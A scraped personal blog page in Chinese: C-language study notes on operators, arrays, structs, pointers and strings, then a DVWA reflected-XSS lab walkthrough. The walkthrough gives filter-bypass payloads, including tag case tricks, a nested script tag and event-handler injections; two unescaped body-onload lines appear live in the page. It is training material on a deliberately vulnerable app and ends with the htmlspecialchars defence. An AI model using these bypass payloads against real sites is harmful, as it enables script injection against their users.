<td>光标回到行首，后面的内容会原本在行首的内容</td>
</tr>
<tr>
<td>\t</td>
<td>制表符</td>
</tr>
<tr>
<td>\\</td>
<td>反斜杠</td>
</tr>
<tr>
<td>?</td>
<td>问好</td>
</tr>
<tr>
<td>\‘</td>
<td>单引号</td>
</tr>
<tr>
<td>\“</td>
<td>双引号</td>
</tr>
</tbody></table>
<h3 id="Declarations"><a href="#Declarations" class="headerlink" title="Declarations"></a>Declarations</h3><p>一个变量在使用之前必须声明。</p>
<p>声明和初始化是两件事。</p>
<p>声明：【int lower, upper, step; 】</p>
<p>声明+初始化：【int i = 0; 】</p>
<p>常量 在前面加一个const表示：const double e = 2.71828182845905; </p>
<h2 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h2><p>【优先级和处理顺序[从左向右/从右向左]】</p>
<p>算术运算符</p>
<p>+、-、*、/、%</p>
<p><img src="D:\blog\H01iday\source_posts\pics\pic.png" alt="pic"></p>
<p>关系运算符</p>
<p>&gt;、&gt;=、&lt;、&lt;=、==、!=</p>
<p>【优先级：关系运算符&lt;算数运算符；关系运算符&gt;赋值运算符】</p>
<p>==、!=  特殊地，比其它的关系运算符低</p>
<p>逻辑运算符</p>
<p>&amp;&amp;、||</p>
<p>赋值运算符</p>
<p>=</p>
<h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(expr1)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//some codes</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(expr2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//some codes</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(expr3)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//some codes</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line">    <span class="keyword">case</span> 整型数值<span class="number">1</span>: 语句 <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">case</span> 整型数值<span class="number">2</span>: 语句 <span class="number">2</span>;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">case</span> 整型数值n: 语句 n;</span><br><span class="line">    <span class="keyword">default</span>: 语句 n+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">注意点：</span><br><span class="line">    <span class="number">1.</span> 当其它所有都匹配不成功，执行<span class="keyword">default</span>语句</span><br><span class="line">    <span class="number">2.</span> 当某个<span class="keyword">case</span>匹配成功，会执行该分支及后所有分支的语句。故适时用<span class="keyword">break</span>很重要</span><br></pre></td></tr></table></figure>





<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>三种语句：while、do-while、for三种语句</p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>//…</p>
<p>/*…*/</p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">dataType  <span class="title">functionName</span><span class="params">(paraType1 param1, ...)</span></span>&#123;</span><br><span class="line">    <span class="comment">//body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>sizeof(a)：给出整个数组占据的字节数</p>
<p>sizeof(a[0])：给出a[0]这个元素所占据的字节数</p>
<p>sizeof(a)/sizeof(a[0])可以得到数组元素的个数</p>
<p>数组变量不能被赋值，意思是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> b[] = a;<span class="comment">//这样是不合法的，如果要将一个数组的所有元素交给另一个数组，必须采用遍历</span></span><br><span class="line"></span><br><span class="line">数组变量是<span class="keyword">const</span>指针，即常量指针；故不能被赋值</span><br><span class="line"><span class="keyword">int</span> b[] ---&gt; <span class="keyword">int</span> * <span class="keyword">const</span> b;</span><br></pre></td></tr></table></figure>



<p>当把数组作为函数参数时：【指针】</p>
<p>​    不能在[]中给出数组的大小</p>
<p>​    不能用sizeof计算数组的元素个数【在函数中】</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a[])</span></span>&#123;</span><br><span class="line">	...body...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里的给到func函数的参数int a[]其实是一个指针，是外面的这个a[]的指针</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dataType arrayName[linesNum][rowsNum];</span><br></pre></td></tr></table></figure>



<h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><h4 id="结构体的定义"><a href="#结构体的定义" class="headerlink" title="结构体的定义"></a>结构体的定义</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义方法1</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *name;  <span class="comment">// 学生名字</span></span><br><span class="line">    <span class="keyword">int</span> num;     <span class="comment">// 学生学号</span></span><br><span class="line">    <span class="keyword">int</span> age;     <span class="comment">// 学生年龄</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 使用该结构体模板创建三个变量stu1, stu2, stu3</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu1</span>, <span class="title">stu2</span>, <span class="title">stu3</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义方法2</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> *name;  <span class="comment">// 学生名字</span></span><br><span class="line"><span class="keyword">int</span> num;     <span class="comment">// 学生学号</span></span><br><span class="line"><span class="keyword">int</span> age;     <span class="comment">// 学生年龄</span></span><br><span class="line">&#125;stu1, stu2, stu3;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义方法3</span></span><br><span class="line"><span class="comment">//typedef：定义数据类型名称，代替系统默认名称</span></span><br><span class="line"><span class="comment">//这里就是用 student代替了struct student</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> *name;  <span class="comment">// 学生名字</span></span><br><span class="line"><span class="keyword">int</span> num;     <span class="comment">// 学生学号</span></span><br><span class="line"><span class="keyword">int</span> age;     <span class="comment">// 学生年龄</span></span><br><span class="line">&#125;student;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用student创建三个结构体变量stu1, stu2, stu3</span></span><br><span class="line">student stu1, stu2, stu3;</span><br></pre></td></tr></table></figure>



<h4 id="结构体的初始化"><a href="#结构体的初始化" class="headerlink" title="结构体的初始化"></a>结构体的初始化</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不指定成员名</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu1</span> =</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;ZhengNianJun&quot;</span>, <span class="comment">// 名字：正念君</span></span><br><span class="line">  <span class="number">520</span>,            <span class="comment">// 学号：520</span></span><br><span class="line">  <span class="number">23</span>              <span class="comment">// 年龄：23</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//指定成员名</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu1</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">   .age = <span class="number">24</span>,</span><br><span class="line">   .num = <span class="number">520</span>,</span><br><span class="line">   .name = <span class="string">&quot;ZhengNianJun&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//可以只初始化某个特定的成员</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu1</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">   .name = <span class="string">&quot;ZhengNianJun&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="访问结构体的成员"><a href="#访问结构体的成员" class="headerlink" title="访问结构体的成员"></a>访问结构体的成员</h4><p>使用点运算符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="keyword">char</span> *name;  <span class="comment">// 学生名字</span></span><br><span class="line"> <span class="keyword">int</span> num;     <span class="comment">// 学生学号</span></span><br><span class="line"> <span class="keyword">int</span> age;     <span class="comment">// 学生年龄</span></span><br><span class="line">&#125;student;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> student stu1;  <span class="comment">// 定义一个结构体变量stu1</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* 给结构体变量stu1的成员进行赋值 */</span></span><br><span class="line"> stu1.name = <span class="string">&quot;ZhengNianJun&quot;</span>;</span><br><span class="line"> stu1.num = <span class="number">520</span>;</span><br><span class="line"> stu1.age = <span class="number">23</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;\n============================================\n&quot;</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;My name is %s\n&quot;</span>, stu1.name);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;My num is %d\n&quot;</span>, stu1.num);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;My age is %d\n&quot;</span>, stu1.age);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;============================================\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>指针是什么?</p>
<p>保存地址的变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%p&quot;</span>, &amp;i);<span class="comment">//中的&amp;用来获取变量的地址</span></span><br></pre></td></tr></table></figure>

<p>数组：</p>
<p>&amp;a == a == &amp;a[0]【可以看到，数组变量本身表达地址，但数组单元表示变量，需要用&amp;取地址】</p>
<p>所以*运算符可以对指针做，也可以对数组做。a就是一个指针，因为它存储的值就是数组的地址。</p>
<p>*a == *p 都是a[0]的值</p>
<p>数组名变量存储的是数组的地址，即数组的第一个元素a[0]的地址</p>
<img src="D:\blog\H01iday\source\_posts\pics\pic1.png" alt="pic1" style="zoom:67%;" />

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> p=&amp;i;</span><br><span class="line"><span class="comment">//下面两种写法是同一个意思，p是一个指针指向一个int变量，而q只是int类型的变量</span></span><br><span class="line"><span class="comment">//*靠近int/变量都没关系</span></span><br><span class="line"><span class="keyword">int</span>* p, q;</span><br><span class="line"><span class="keyword">int</span> *p, q;</span><br></pre></td></tr></table></figure>



<p>指针作为函数参数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> *p)</span></span>;<span class="comment">//一个参数为指针变量的函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;f(&amp;i);<span class="comment">//函数调用，参数必须给的是变量地址。通过地址，在函数内部可以来访问外部的i</span></span><br></pre></td></tr></table></figure>



<p>访问地址对应的变量*</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">6</span>;</span><br><span class="line">	f(&amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after f function:i=%d\n&quot;</span>, i);<span class="comment">//output:  after f function:i=26</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> *p)</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;*p=%d\n&quot;</span>, *p);<span class="comment">//output:*p=6</span></span><br><span class="line">    *p = <span class="number">26</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<p>函数的返回值为指针时应该怎么办？</p>
<p>和函数返回普通类型格式相同，唯一不同：在函数名前加*，表明该函数返回一个指针值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int *function(paraType para)</span><br><span class="line">&#123;	</span><br><span class="line">	body;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>指针和一维数组！！</p>
<table>
<thead>
<tr>
<th></th>
<th><strong>下标法</strong></th>
<th><strong>地址法</strong></th>
<th><strong>指针法</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>第k个元素</strong></td>
<td>a[k]</td>
<td>*(a+k)</td>
<td>*(p+k)</td>
</tr>
<tr>
<td><strong>第k个元素的地址</strong></td>
<td>&amp;a[k]</td>
<td>a+k</td>
<td>p+k</td>
</tr>
</tbody></table>
<p><strong>p[k]等价于 a[k]</strong></p>
<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>C语言中的字符串是以字符数组的形态存在</p>
<p>以0或者’\0’结尾，这两者是一样的，但是和’0’不一样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> word[] = &#123;<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, word);<span class="comment">//output:HTLL0!</span></span><br><span class="line"><span class="keyword">char</span> word[] = &#123;<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, word);<span class="comment">//output:HELL</span></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/10/26/xss-dvwa/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/10/26/xss-dvwa/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-10-26 18:53:49" itemprop="dateCreated datePublished" datetime="2021-10-26T18:53:49+08:00">2021-10-26</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-27 21:47:51" itemprop="dateModified" datetime="2021-10-27T21:47:51+08:00">2021-10-27</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>反射型XSS</p>
<h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这里没有任何的防御，直接注入js即可</p>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这里做的一个防御措施就是，将&lt;script&gt;tag换成空串也很好绕过</p>
<p>大小写绕过</p>
<p>&lt;Script&gt;alert(‘xxx’)&lt;/script&gt;</p>
<p>组合过滤条件绕过</p>
<p>&lt;scr&lt;script&gt;ipt&gt;alert(‘sss’)&lt;/script&gt;</p>
<p>尝试使用别的标签来绕过</p>
<body onload=alert('s')>

<p>&lt;a href=’’ onclick=alert(‘ss’)&gt;click&lt;/a&gt;</p>
<p>&lt;a href=’’ onclick=alert(/ss/)&gt;click&lt;/a&gt;</p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php函数：array_key_exists — 检查数组里是否有指定的键名</p>
<p>$_GET变量是一个数组，内容是由 HTTP GET 方法发送的变量名称和值。</p>
<p><code> $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</code>这里可以看到对&lt;script&gt;标签进行了严格的过滤。</p>
<p><code>.</code>匹配除换行符 \n 之外的任何单字符。</p>
<p><code>*</code>匹配前面的子表达式零次或多次。</p>
<p><code>/i</code>指不区分大小写</p>
<p>不用&lt;script&gt;标签罢了，可以用img iframe等其他标签来绕过</p>
<body onload=alert('s')>

<p>&lt;img src=”” onerror=alert(‘xss’)&gt;</p>
<p>&lt;a href=’’ onclick=alert(‘ss’)&gt;click&lt;/a&gt;</p>
<p>&lt;a href=’’ onclick=alert(/ss/)&gt;click&lt;/a&gt;</p>
<h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这里最重点的一个操作为htmlspecialchars【php函数】</p>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;This is some &lt;b&gt;bold&lt;/b&gt; text.&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;<span class="comment">//output：This is some bold text.【其中bold被加粗】</span></span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars(<span class="variable">$str</span>);<span class="comment">//output：This is some &lt;b&gt;bold&lt;/b&gt; text.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>所有注入的&lt;&gt;都会被原样输出，不会被解析成html代码。这样也就无法构造标签进行攻击。</p>
